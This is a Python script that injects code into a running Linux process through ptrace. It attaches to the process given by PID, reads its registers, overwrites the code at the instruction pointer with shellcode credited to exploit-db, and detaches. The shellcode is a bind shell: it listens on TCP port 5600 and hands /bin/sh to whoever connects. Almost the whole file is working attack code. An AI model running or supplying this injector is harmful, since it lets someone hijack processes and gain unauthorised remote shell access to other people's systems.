# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.
# GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c 

import ctypes
import sys
import struct

# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html

PTRACE_POKETEXT   = 4
PTRACE_GETREGS	= 12
PTRACE_SETREGS	= 13
PTRACE_ATTACH 	= 16
PTRACE_DETACH 	= 17

# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct

class user_regs_struct(ctypes.Structure):
	_fields_ = [
    	("r15", ctypes.c_ulonglong),
    	("r14", ctypes.c_ulonglong),
    	("r13", ctypes.c_ulonglong),
    	("r12", ctypes.c_ulonglong),
    	("rbp", ctypes.c_ulonglong),
    	("rbx", ctypes.c_ulonglong),
    	("r11", ctypes.c_ulonglong),
    	("r10", ctypes.c_ulonglong),
    	("r9", ctypes.c_ulonglong),
    	("r8", ctypes.c_ulonglong),
    	("rax", ctypes.c_ulonglong),
    	("rcx", ctypes.c_ulonglong),
    	("rdx", ctypes.c_ulonglong),
    	("rsi", ctypes.c_ulonglong),
    	("rdi", ctypes.c_ulonglong),
    	("orig_rax", ctypes.c_ulonglong),
    	("rip", ctypes.c_ulonglong),
    	("cs", ctypes.c_ulonglong),
    	("eflags", ctypes.c_ulonglong),
    	("rsp", ctypes.c_ulonglong),
    	("ss", ctypes.c_ulonglong),
    	("fs_base", ctypes.c_ulonglong),
    	("gs_base", ctypes.c_ulonglong),
    	("ds", ctypes.c_ulonglong),
    	("es", ctypes.c_ulonglong),
    	("fs", ctypes.c_ulonglong),
    	("gs", ctypes.c_ulonglong),
	]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))

print("Instruction Pointer: " + hex(registers.rip))

print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db.
shellcode="\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
 
  # Convert the byte to little endian.
  shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
  shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
  shellcode_byte=int(shellcode_byte_little_endian,16)
 
  # Inject the byte.
  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))

print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
